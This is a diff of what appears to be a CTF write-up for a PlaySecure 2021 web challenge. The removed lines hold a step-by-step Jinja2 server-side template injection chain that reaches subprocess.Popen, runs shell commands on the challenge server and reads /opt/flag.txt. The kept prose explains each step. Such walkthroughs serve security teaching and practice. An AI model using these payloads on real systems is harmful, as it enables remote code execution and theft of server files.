@@ -86,47 +86,11 @@ We can avoid using underscore `_` in desc parameter by defining a new GET parame
 
 ![wc11](/assets/playsecure2021/wc11.png)
 
-```python
-POST /generate?class=__class__ HTTP/1.1
-Host: web.ps.ctf.ae:8882
-Content-Length: 92
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://web.ps.ctf.ae:8882
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://web.ps.ctf.ae:8882/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Connection: close
-
-firstName=a&lastName=b&desc={% set string = "abc" %}{{string|attr(request.args.class)|safe}}
-```
-
 **Retrieving Method Resolution Order of str Class**
 
 ![wc12](/assets/playsecure2021/wc12.png)
 
 At index 1 of the MRO (method resolution order), we have the `<class 'object'>`.
-
-```
-POST /generate?class=__class__&mro=__mro__ HTTP/1.1
-Host: web.ps.ctf.ae:8882
-Content-Length: 134
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://web.ps.ctf.ae:8882
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://web.ps.ctf.ae:8882/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Connection: close
-
-firstName=a&lastName=b&desc={% set string = "abc" %}{% set cls = string|attr(request.args.class) %}{{cls|attr(request.args.mro)|safe}}
-```
 
 **Retrieving The index 1 of MRO**
 
@@ -134,71 +98,17 @@ firstName=a&lastName=b&desc={% set string = "abc" %}{% set cls = string|attr(req
 
 ![wc13](/assets/playsecure2021/wc13.png)
 
-```
-POST /generate?class=__class__&mro=__mro__&getitem=__getitem__ HTTP/1.1
-Host: web.ps.ctf.ae:8882
-Content-Length: 202
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://web.ps.ctf.ae:8882
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://web.ps.ctf.ae:8882/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Connection: close
-
-firstName=a&lastName=b&desc={% set string = "abc" %}{% set cls = string|attr(request.args.class) %}{% set mro = cls|attr(request.args.mro) %}{% set obj = mro|attr(request.args.getitem)(1) %}{{obj|safe}}
-```
 Now we have the `<class 'object'>`.
 
 **Getting the subclasses**
 
 ![wc14](/assets/playsecure2021/wc14.png)
 
-```
-POST /generate?class=__class__&mro=__mro__&getitem=__getitem__&sc=__subclasses__ HTTP/1.1
-Host: web.ps.ctf.ae:8882
-Content-Length: 259
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://web.ps.ctf.ae:8882
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://web.ps.ctf.ae:8882/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Connection: close
-
-firstName=a&lastName=b&desc={% set string = "abc" %}{% set cls = string|attr(request.args.class) %}{% set mro = cls|attr(request.args.mro) %}{% set obj = mro|attr(request.args.getitem)(1) %}{% set subclasses = obj|attr(request.args.sc)() %}{{subclasses|safe}}
-```
-
 **Finding Index of subprocess.Popen**
 
 subprocess.Popen is of interest to us as it would allow us to run system commands. This is located at 411 index in subclasses list.
 
 ![wc15](/assets/playsecure2021/wc15.png)
-
-```
-POST /generate?class=__class__&mro=__mro__&getitem=__getitem__&sc=__subclasses__ HTTP/1.1
-Host: web.ps.ctf.ae:8882
-Content-Length: 314
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://web.ps.ctf.ae:8882
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://web.ps.ctf.ae:8882/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Connection: close
-
-firstName=a&lastName=b&desc={% set string = "abc" %}{% set cls = string|attr(request.args.class) %}{% set mro = cls|attr(request.args.mro) %}{% set obj = mro|attr(request.args.getitem)(1) %}{% set subclasses = obj|attr(request.args.sc)() %}{% set popen = subclasses|attr(request.args.getitem)(411) %}{{popen|safe}}
-
-```
 
 subprocess.Popen
 
@@ -209,24 +119,6 @@ subprocess.Popen
 
 ![wc17](/assets/playsecure2021/wc17.png)
 
-```
-POST /generate?class=__class__&mro=__mro__&getitem=__getitem__&sc=__subclasses__ HTTP/1.1
-Host: web.ps.ctf.ae:8882
-Content-Length: 357
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://web.ps.ctf.ae:8882
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://web.ps.ctf.ae:8882/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Connection: close
-
-firstName=a&lastName=b&desc={% set string = "abc" %}{% set cls = string|attr(request.args.class) %}{% set mro = cls|attr(request.args.mro) %}{% set obj = mro|attr(request.args.getitem)(1) %}{% set subclasses = obj|attr(request.args.sc)() %}{% set popen = subclasses|attr(request.args.getitem)(411) %}{{popen('ls /',shell=True,stdout=-1).communicate()|safe}}
-```
-
 Shows the output of `ls /` command.
 
 ### Finding and Retrieving the Flag
@@ -235,47 +127,11 @@ Searching for flag.txt:
 
 ![wc18](/assets/playsecure2021/wc18.png)
 
-```
-POST /generate?class=__class__&mro=__mro__&getitem=__getitem__&sc=__subclasses__ HTTP/1.1
-Host: web.ps.ctf.ae:8882
-Content-Length: 397
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://web.ps.ctf.ae:8882
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://web.ps.ctf.ae:8882/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Connection: close
-
-firstName=a&lastName=b&desc={% set string = "abc" %}{% set cls = string|attr(request.args.class) %}{% set mro = cls|attr(request.args.mro) %}{% set obj = mro|attr(request.args.getitem)(1) %}{% set subclasses = obj|attr(request.args.sc)() %}{% set popen = subclasses|attr(request.args.getitem)(411) %}{{popen('find / -type f -name flag.txt 2> /dev/null',shell=True,stdout=-1).communicate()|safe}}
-```
-
 Flag is at **/opt/flag.txt**
 
 Getting flag contents:
 
 ![wc19](/assets/playsecure2021/wc19.png)
 
-```
-POST /generate?class=__class__&mro=__mro__&getitem=__getitem__&sc=__subclasses__ HTTP/1.1
-Host: web.ps.ctf.ae:8882
-Content-Length: 372
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://web.ps.ctf.ae:8882
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://web.ps.ctf.ae:8882/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Connection: close
-
-firstName=a&lastName=b&desc={% set string = "abc" %}{% set cls = string|attr(request.args.class) %}{% set mro = cls|attr(request.args.mro) %}{% set obj = mro|attr(request.args.getitem)(1) %}{% set subclasses = obj|attr(request.args.sc)() %}{% set popen = subclasses|attr(request.args.getitem)(411) %}{{popen('cat /opt/flag.txt',shell=True,stdout=-1).communicate()|safe}}
-
-```
 
 *FLAG: CTFAE{ASurpriseToBeSureButAWelcomeOne}*
